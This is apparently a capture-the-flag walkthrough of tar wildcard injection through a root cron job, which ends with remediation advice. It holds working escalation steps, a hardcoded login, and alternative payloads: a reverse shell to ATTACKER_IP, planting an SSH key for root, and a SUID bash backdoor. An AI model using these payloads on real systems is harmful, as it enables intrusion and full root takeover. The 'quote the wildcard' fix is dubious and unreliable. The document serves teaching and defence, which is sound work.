# Privilege Escalation Writeup — Wildcard Tar

**Category:** Linux Privilege Escalation
**Difficulty:** Hard
**Flag:** `CTF{w1ldcard_t4r_g0t_r00t!}`
**Responsible:** Joshua

---

## Overview

The container runs a cron job as root that backs up `/data/uploads` every minute. The backup command uses a shell wildcard (`*`), which the shell expands to the names of all files in the directory before passing them to `tar`. Because `/data/uploads` is world-writable (`chmod 777`), an attacker with any shell in the container can plant specially named files that tar interprets as command-line flags — including one that executes an arbitrary command.

The flag is at `/root/flag.txt`, readable only by root. The wildcard injection achieves code execution as root, enabling us to read it.

---

## Prerequisites

You need a shell inside the container running as a low-privilege user. The primary path is:

1. Download `corpchat-admin` from the file manager at `/files`.
2. Reverse engineer it (Stage 4) to extract `svc_backup` / `netterFeger69#`.
3. SSH in: `ssh svc_backup@<ip>`

Alternatively, any RCE obtained through web vulnerabilities (e.g., XSS → SSRF → command injection) gives you a shell as the `corpchat` user, which also works.

---

## Background: Wildcard Injection in tar

### How Shell Wildcards Work

When bash encounters `*` in a command, it expands the wildcard to a sorted list of filenames in the current directory **before** passing them to the program:

```bash
# In a directory containing: file1.txt  file2.txt  --help
tar -czf out.tar.gz *
# Becomes:
tar -czf out.tar.gz --help file1.txt file2.txt
```

Notice that `--help` is passed as a flag, not as a filename. The shell does not distinguish — it just inserts the string. The program receiving it (`tar`) then parses the arguments, treating strings starting with `--` as options.

### Relevant tar Options

| Option | Effect |
|--------|--------|
| `--checkpoint=N` | Print a progress message every N blocks processed |
| `--checkpoint-action=exec=CMD` | Execute CMD at each checkpoint |

Combining these two makes tar execute an arbitrary command while running.

### Why `/data/uploads` is Vulnerable

`entrypoint.py` explicitly sets the upload directory world-writable:

```python
os.makedirs('/data/uploads', exist_ok=True)
os.chmod('/data/uploads', 0o777)
```

This is intentional: the web application needs the `corpchat` service account to write uploaded files, and the wildcard tar is the CTF privesc vector.

### The Cron Job

```
* * * * * root cd /data/uploads && tar -czf /tmp/uploads_backup.tar.gz *
```

Breaking this down:

| Part | Meaning |
|------|---------|
| `* * * * *` | Run every minute (every minute of every hour, day, month, weekday) |
| `root` | Run as the root user |
| `cd /data/uploads` | Change to the world-writable upload directory |
| `tar -czf /tmp/uploads_backup.tar.gz *` | Archive everything; `*` expands to all filenames |

---

## Step 1 — Gain a Shell

```bash
ssh svc_backup@<ip>
# Password: netterFeger69#
```

You are now logged in as `svc_backup`. Check your effective user:

```bash
id
# uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)
whoami
# svc_backup
```

---

## Step 2 — Enumerate Cron Jobs

Check all cron sources:

```bash
# System-wide crontab
cat /etc/crontab

# Drop-in cron files (most specific)
ls -la /etc/cron.d/
cat /etc/cron.d/corpchat-backup

# Per-user crontabs
crontab -l
```

Output of `/etc/cron.d/corpchat-backup`:

```
* * * * * root cd /data/uploads && tar -czf /tmp/uploads_backup.tar.gz *
```

Confirm the directory permissions:

```bash
ls -la /data/ | grep uploads
# drwxrwxrwx  ... uploads
```

World-writable (`rwxrwxrwx`). Any user can create and delete files here.

---

## Step 3 — Confirm the Flag Location

```bash
# Attempt to read the flag directly (should fail)
cat /root/flag.txt
# cat: /root/flag.txt: Permission denied

# Confirm it exists
ls -la /root/flag.txt 2>/dev/null || echo "Can't list /root"

# Check who owns processes (confirms root is running cron)
ps aux | grep cron
# root    ... /usr/sbin/cron -f
```

---

## Step 4 — Create the Exploit

Move to the world-writable upload directory and create three files:

```bash
cd /data/uploads

# 1. The payload script
cat > exploit.sh << 'EOF'
#!/bin/bash
cp /root/flag.txt /tmp/pwned.txt
chmod 777 /tmp/pwned.txt
EOF
chmod +x exploit.sh

# 2. The tar checkpoint option file
# Note: the filename IS the tar argument
printf '' > '--checkpoint=1'

# 3. The tar checkpoint-action option file
# Note: 'sh exploit.sh' will run from /data/uploads (cron does cd there first)
printf '' > '--checkpoint-action=exec=sh exploit.sh'
```

Verify:

```bash
ls -la /data/uploads/
# total ...
# ...
# -rw-r--r-- 1 svc_backup svc_backup  0 ... --checkpoint-action=exec=sh exploit.sh
# -rw-r--r-- 1 svc_backup svc_backup  0 ... --checkpoint=1
# -rwxr-xr-x 1 svc_backup svc_backup 62 ... exploit.sh
```

### What Happens When Cron Fires

The shell expands `*` in `/data/uploads` to (alphabetically sorted):

```
--checkpoint-action=exec=sh exploit.sh
--checkpoint=1
exploit.sh
<...any other uploaded files...>
```

`tar` receives these as arguments:

```bash
tar -czf /tmp/uploads_backup.tar.gz \
    --checkpoint-action=exec=sh exploit.sh \
    --checkpoint=1 \
    exploit.sh \
    ...
```

`tar` parses `--checkpoint-action=exec=sh exploit.sh` as an option — it will run `sh exploit.sh` when it hits a checkpoint. `--checkpoint=1` makes it checkpoint after every block (i.e., immediately). `exploit.sh` is then both a file to archive and the script that runs.

`exploit.sh` runs as root (because tar runs as root), copies `/root/flag.txt` to `/tmp/pwned.txt`, and makes it world-readable.

---

## Step 5 — Wait and Read the Flag

Cron runs at the top of every minute. The maximum wait time is 60 seconds.

```bash
# Watch for the file to appear
while [ ! -f /tmp/pwned.txt ]; do
  echo "Waiting..."
  sleep 5
done

cat /tmp/pwned.txt
```

Output:

```
CTF{w1ldcard_t4r_g0t_r00t!}
```

**Flag: `CTF{w1ldcard_t4r_g0t_r00t!}`**

---

## Alternative Payloads

### Reverse Shell (Root)

```bash
cat > exploit.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

Set up a listener on your attacker machine:

```bash
nc -lvnp 4444
```

Wait for cron. When it fires you get a root shell.

### Add SSH Key

```bash
cat > exploit.sh << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA...your-public-key... attacker" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF
```

Then SSH in directly:

```bash
ssh root@<ip> -i your-private-key
```

### Create a SUID Shell

```bash
cat > exploit.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

After cron fires:

```bash
/tmp/rootbash -p
whoami
# root
```

---

## How the Challenge Was Set Up

`entrypoint.py` performs all challenge setup as root before dropping privileges:

```python
def setup_challenge():
    # Write the flag — only root-readable
    flag_path = '/root/flag.txt'
    if not os.path.exists(flag_path):
        with open(flag_path, 'w') as f:
            f.write('CTF{w1ldcard_t4r_g0t_r00t!}\n')
        os.chmod(flag_path, 0o600)

    # Install the vulnerable cron job
    cron_path = '/etc/cron.d/corpchat-backup'
    if not os.path.exists(cron_path):
        with open(cron_path, 'w') as f:
            f.write('* * * * * root cd /data/uploads && tar -czf /tmp/uploads_backup.tar.gz *\n')
        os.chmod(cron_path, 0o644)

    # Seed the corpchat-admin binary (Stage 4)
    admin_src = '/opt/corpchat/corpchat-admin'
    admin_dst = '/data/uploads/tools/corpchat-admin'
    if os.path.isfile(admin_src) and not os.path.exists(admin_dst):
        shutil.copy2(admin_src, admin_dst)
        os.chmod(admin_dst, 0o755)
```

After this, `drop_privileges('corpchat')` runs:

```python
os.setgroups([pw.pw_gid])
os.setgid(pw.pw_gid)
os.setuid(pw.pw_uid)
```

Flask (and any shell you get via web exploits) runs as `corpchat`. The cron job continues running as root, and `/data/uploads` stays `777`.

---

## Filesystem Permission Model

Understanding the container's permission structure helps with escalation:

```
/
├── root/
│   └── flag.txt       (chmod 600, owned by root:root)  ← TARGET
├── data/
│   ├── corpchat.db    (owned by corpchat:corpchat)
│   ├── uploads/       (chmod 777 — world-writable)     ← EXPLOIT POINT
│   │   └── tools/     (chmod 777)
│   │       └── corpchat-admin  (chmod 755)
│   └── logs/
├── app/               (owned by root:corpchat, group-readable)
└── etc/
    └── cron.d/
        └── corpchat-backup  (chmod 644, root-owned)    ← CRON JOB
```

The `corpchat` service account can write to `/data/uploads` (world-writable) but cannot read `/root`. The cron job runs as root and can read everything.

---

## Why This Vulnerability Exists in Real Systems

Wildcard injection via tar has appeared in countless real-world privilege escalation scenarios. The recipe is always the same:

1. A script running as a privileged user uses `*` in a `tar`, `rsync`, or `find` command.
2. The directory containing the files is writable by a less-privileged user.
3. The less-privileged user creates files with names that match command-line flags.

Real examples include:
- Backup scripts run from cron as root
- CI/CD pipelines operating on build artifact directories
- Log archival jobs

---

## Remediation (Real World)

| Fix | Description |
|-----|-------------|
| Quote the wildcard | `tar -czf out.tar.gz "./*"` — forces bash to treat `*` as a literal pathname, not expand it to argument fragments |
| Use `--` separator | `tar -czf out.tar.gz -- *` — signals end of options; tar won't treat filenames starting with `--` as flags |
| Restrict directory permissions | The upload directory should be writable only by the service account, not world-writable (`chmod 750` or `chmod 700`) |
| Run as dedicated account | The backup cron job should not run as root if it only needs to read `/data/uploads` |
| Use absolute paths | Reference files by absolute path pattern rather than wildcards where possible |
